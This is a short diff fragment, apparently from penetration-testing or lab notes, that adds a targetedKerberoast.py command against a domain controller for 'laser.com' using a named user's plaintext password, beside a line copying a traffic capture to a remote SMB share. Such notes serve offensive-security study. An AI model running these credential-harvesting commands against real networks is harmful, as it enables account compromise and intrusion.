@@ -25,7 +25,7 @@ copy traffic-capture-latest.pcapng \\192.168.45.186\share\
 ```
 
 ```
-
+python3 ~/Desktop/Tools/Windows/targetedKerberoast.py --dc-ip '192.168.245.172' -v -d 'laser.com' -u 'Yulia.Weber' -p 'Yulia@Laser777'
 ```
 
 ```
